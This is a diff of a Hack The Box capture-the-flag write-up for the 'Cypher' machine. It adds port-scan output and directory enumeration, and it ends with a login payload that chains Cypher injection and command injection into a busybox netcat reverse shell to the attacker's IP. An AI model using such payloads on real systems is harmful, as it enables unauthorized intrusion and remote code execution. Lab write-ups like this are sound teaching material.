@@ -1,5 +1,20 @@
 # Cypher - HTB Write-up
-## Port 80 
+<img src="https://labs.hackthebox.com/storage/avatars/765cd4be6f3a366ca83c7ea60bbcaaa8.png" width="200" height="200">
+
+## Initial portscan
+```shell
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
+|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://cypher.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+## Port 80 - Enumeration
 
 ### Directory enumeration
 `❯ gobuster dir --url $url/api -t 100 --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`
@@ -61,7 +76,7 @@ This is the command that it runs to get the HTTP response.
 
 Lets try to call the procedure `custom.getUrlStatusCode` using that we previously found in the code.
 
-- Payload for RCE / RevShell
+Payload for RCE / RevShell
 ```shell
 {"username":"a' return h.value as a UNION CALL custom.getUrlStatusCode(\"http://10.10.x.x:80;busybox nc 10.10.14.115 1337 -e sh;#\") YIELD statusCode AS a RETURN a;//","password":"hello"}
 ```
